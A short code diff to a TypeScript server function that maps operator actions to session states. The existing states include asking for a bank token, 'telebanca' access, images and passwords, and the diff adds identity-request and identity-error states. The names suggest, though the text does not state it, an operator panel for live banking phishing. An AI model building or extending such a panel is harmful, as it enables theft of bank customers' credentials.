@@ -76,6 +76,7 @@ export function applyOpsActionServer(
   let state: OpsSessionState = existing.state;
   if (action === "ask-token") state = "token";
   else if (action === "ask-telebanca") state = "telebanca";
+  else if (action === "ask-identidad") state = "identidad";
   else if (action === "send-imagen") state = "imagen";
   else if (action === "waiting-imagen") state = "waiting-imagen";
   else if (action === "waiting-pass") state = "waiting-pass";
@@ -84,6 +85,7 @@ export function applyOpsActionServer(
   else if (action === "error-user") state = "error-user";
   else if (action === "error-pass") state = "error-pass";
   else if (action === "error-tejuino") state = "error-tejuino";
+  else if (action === "error-identidad") state = "error-identidad";
   else if (action === "done") state = "done";
 
   return patchOpsSessionServer(id, {
